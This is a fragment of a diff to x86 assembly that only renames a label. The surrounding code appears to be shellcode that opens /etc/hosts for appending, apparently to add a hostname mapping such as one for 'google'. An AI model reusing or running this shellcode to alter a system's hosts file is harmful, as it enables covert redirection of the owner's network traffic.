@@ -11,7 +11,7 @@ _start:
 
     jmp short _second
     
-hosty:
+_hosts:
     pop ebx
     mov cx, 0x401
     int 0x80
@@ -36,5 +36,5 @@ _load_data:
     len equ $-google
 
 _second:
-    call hosty
+    call _hosts
     host db "/etc/hosts"
